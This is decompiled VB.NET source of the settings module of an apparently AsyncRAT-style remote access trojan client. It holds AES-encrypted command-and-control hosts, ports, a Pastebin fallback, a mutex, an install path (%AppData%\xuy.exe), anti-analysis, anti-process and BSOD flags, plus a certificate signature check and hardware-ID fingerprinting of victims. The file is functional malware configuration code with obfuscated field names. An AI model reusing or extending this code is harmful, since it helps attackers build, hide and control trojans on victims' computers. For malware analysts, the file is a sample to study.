Imports System
Imports System.Security.Cryptography
Imports System.Security.Cryptography.X509Certificates
Imports System.Text
Imports Client.Algorithm
Imports Client.Helper

Namespace Client
	' Token: 0x02000003 RID: 3
	Public Module Settings
		' Token: 0x06000003 RID: 3 RVA: 0x00002814 File Offset: 0x00000A14
		Public Function InitializeSettings() As Boolean
			Dim flag As Boolean
			Try
				Settings.Key = Encoding.UTF8.GetString(Convert.FromBase64String(Settings.Key))
				Settings.aes256 = New Aes256(Settings.Key)
				Settings.Por_ts = Settings.aes256.Decrypt(Settings.Por_ts)
				Settings.Hos_ts = Settings.aes256.Decrypt(Settings.Hos_ts)
				Settings.Ver_sion = Settings.aes256.Decrypt(Settings.Ver_sion)
				Settings.In_stall = Settings.aes256.Decrypt(Settings.In_stall)
				Settings.MTX = Settings.aes256.Decrypt(Settings.MTX)
				Settings.Paste_bin = Settings.aes256.Decrypt(Settings.Paste_bin)
				Settings.An_ti = Settings.aes256.Decrypt(Settings.An_ti)
				Settings.Anti_Process = Settings.aes256.Decrypt(Settings.Anti_Process)
				Settings.BS_OD = Settings.aes256.Decrypt(Settings.BS_OD)
				Settings.Group = Settings.aes256.Decrypt(Settings.Group)
				Settings.Hw_id = HwidGen.HWID()
				Settings.Server_signa_ture = Settings.aes256.Decrypt(Settings.Server_signa_ture)
				Settings.Server_Certificate = New X509Certificate2(Convert.FromBase64String(Settings.aes256.Decrypt(Settings.Certifi_cate)))
				flag = Settings.VerifyHash()
			Catch
				flag = False
			End Try
			Return flag
		End Function

		' Token: 0x06000004 RID: 4 RVA: 0x00002980 File Offset: 0x00000B80
		Private Function VerifyHash() As Boolean
			Dim flag As Boolean
			Try
				Dim rsacryptoServiceProvider As RSACryptoServiceProvider = CType(Settings.Server_Certificate.PublicKey.Key, RSACryptoServiceProvider)
				Using sha256Managed As SHA256Managed = New SHA256Managed()
					flag = rsacryptoServiceProvider.VerifyHash(sha256Managed.ComputeHash(Encoding.UTF8.GetBytes(Settings.Key)), CryptoConfig.MapNameToOID("SHA256"), Convert.FromBase64String(Settings.Server_signa_ture))
				End Using
			Catch ex As Exception
				flag = False
			End Try
			Return flag
		End Function

		' Token: 0x04000001 RID: 1
		Public Por_ts As String = "VUrTFRbFlYVALuVycRgKUc1AliTS1zXt0UgxoyWY1qbchStZY5KSO+yruvv+/AI6713bS5DKwzwJkU28AfT5bg=="

		' Token: 0x04000002 RID: 2
		Public Hos_ts As String = "kzlogcH+KhVFUuULEvfAy+hFjCrAhdj+//Vi0k46GHT5XYIw25a6rWZmYgrF3fp8JqH3q7V1gQN4a3NGoy50UDMH1L0q/48BPF/Y2dfU8k8="

		' Token: 0x04000003 RID: 3
		Public Ver_sion As String = "I13H41QMMVNp++sQjM/sNM127I1gzFHfS+2H/wNJTOiUgh+f25GOJWFzBeoigg0An+jGkgzOgBdRlsoMI9C1lA=="

		' Token: 0x04000004 RID: 4
		Public In_stall As String = "9DN0bisL0sAUoI2rUJge5hzwTKi8CAyXirru65xnyVetqwElK+4hLisP7fupnxwo+0hh5BT494/jex6X7/Hxrg=="

		' Token: 0x04000005 RID: 5
		Public Install_Folder As String = "%AppData%"

		' Token: 0x04000006 RID: 6
		Public Install_File As String = "xuy.exe"

		' Token: 0x04000007 RID: 7
		Public Key As String = "cVhkbWxFdDc0NHY3Z0hhNmxwUGxyUVFxWVppYmhZTWE="

		' Token: 0x04000008 RID: 8
		Public MTX As String = "1aKi7/H4T679NIuh+cwd482JT36rIecnmEH0Ujia/nKhfp+eTQTERv3kpERDhERxzSQ7PMxijAqR5n1vPcw7Y2R4dP6not4PxbTgWaRNH9E="

		' Token: 0x04000009 RID: 9
		Public Certifi_cate As String = "kRnrU9IRbQKSmJbSK8jf42wzFqHPfs2immc5Q/UdEch23V4C8YXLiXKx43rIMHg6tj5lqAR2E7M3MZ8+EeieDbYGDRKkJfgbjTSL2Wbv5ZH3Oala1hl3MGP+Hv8zR+Pjeb3nuPwKKF18BSKAoWFF+nKoJZcBLkcuHvuG5ew6yUFafeXjGp5CpO74dVsYqT4TajOwFpBYmDEepZ/ZbRTigl6ijDhhJ8wNZiREgkQ/Zcn7lMI0ddRwSiKYEiBV4iUAhxQam6GoEVoMQrzsEShaONSJiTArgVGWBb/W6XbUN96WQ/MyonJQrApydPsx2JoVtuW/uFqU0/I7m3mlXp+5JKtxlF8s/EiS3qqfXw9cBK1igb/sz88acurmPbyYGR0kqiayVTEDYX4ISdrUGElG6y7nmK0c7kDRVwfBrX8nsAJHh8OHp+GU9Ri9Kj1DwlLr6nTx1AgTbWpbE/lDxJuz5n5ttUVxefjD6xQGiy7A6VEZexPhPSjdwlX5Cd4i+qAhByshltSvXaKRz/2hIEh1SrXB2NnEYRoVSiWdndkBxMlHG/Si1f4KQISO9sZdI91fwe6M+GA+X6t5zgKQJNiGJ6MUyr8UsjL28Kgs6PNkHMKrePXuVdeo+KSpwXcKL0Sm5RgGAq0xaFawOUQEc9ttQdWHjvupQC3mg5SNU4AKB+GcVmC5nxWtFZcJfCAbb/EMp/bFvqMjA8lWSuSBZz2xMngHZ8mDP7hF/4WopgUfhrMEHhNnkuLpgac0RdETdHWjPGS/MoLOr8bfA9W2jGhNcViMEFj5zVYE1TdEuYI16R0sJpZ/VwbUqD5ANEb+TFocdbjjjpp2Ieg5X2stKJ2LZPF8moY+YD8Hd/G8MeiuTBGDls0fUuY69MgDGUq9Z5h7snjYzPzfw9T4Y2Ki2vwuULx7SrPGOUC3JLBoeUkoEH+X9FVFGNEV9/0lCaG55a7irnKF6oI9PrV8SdkLgu6/AhuB4mWeXG/L/PdRB0LJqJv6d+qODcJdSEnn3jMe6AanPFPEtXkIJo8nna/HNe7fygi/jlS8gTRV9vvmmYtEHGOD/lUA1IFR5n248NEZ+h/T"

		' Token: 0x0400000A RID: 10
		Public Server_signa_ture As String = "wLNsmaqIFkO8pCiu7DCU/+Kdqvr9OWWMdasLm90mjO7cgfaVkeK6pytGyC8lWmQ7FXdiGRYbDBIiZQFg47GAkp9/e6rAKlrAtZe8lBF0CbCRMEKdtFngjR80CQdTSDrMfmqZGC+DgX/rd3+E6O2p+/UPMvRz+nh7CK8XxcAQ74uHgb5H2jh+zRfb5xLYmvz7iXYeWD9Hrpuxh4ZVDtGSI3cRj5Vr5MKs8bbIjaWLyIR05CSrJl+FmB793COCYGYMMec+a088rg8jBuYSEfK//TXEr+iKgKBsltUBSInKoww="

		' Token: 0x0400000B RID: 11
		Public Server_Certificate As X509Certificate2

		' Token: 0x0400000C RID: 12
		Public aes256 As Aes256

		' Token: 0x0400000D RID: 13
		Public Paste_bin As String = "QOr5r8wOgnzNIPtRs3G0P4BDQse4Vqm6KoxVtf4JOTig35eWVNDR38/kA2sIWIUAwI+qUwKNoXn+wXzpZSbqDQ=="

		' Token: 0x0400000E RID: 14
		Public BS_OD As String = "Xd0BHY0lqSPL4vc6KX4tGDVWZV2BIUltep1UEOa6V9ZnS72SRc/ja/Is8MolZ41t2uY5UVRgfM0z86dnD99ogA=="

		' Token: 0x0400000F RID: 15
		Public Hw_id As String = Nothing

		' Token: 0x04000010 RID: 16
		Public De_lay As String = "1"

		' Token: 0x04000011 RID: 17
		Public Group As String = "lstCHQKP30Z/iG980+Egui6tDYNtPI7KMqKKKVdrHNHNqX6CbwrDrFC/R4ZLnibi1I/86jTOUnGIWIsYV+Hi/w=="

		' Token: 0x04000012 RID: 18
		Public Anti_Process As String = "5kHlkGGFNuoNfPJZiAWDZpKPYQgxN9L30u28bOlL4hhYamPfW/JqBU+tiWdY1qdbEdEMIQibzN9U7Bwu+OgmRg=="

		' Token: 0x04000013 RID: 19
		Public An_ti As String = "C+iWHcvlHETYUGNg6EljQsy1++gia2T11nySaYiEgU2p2p6WY9l+mjxPIqtN9Tv1TQw8zWcT/T4y8yVQlBSl0g=="
	End Module
End Namespace
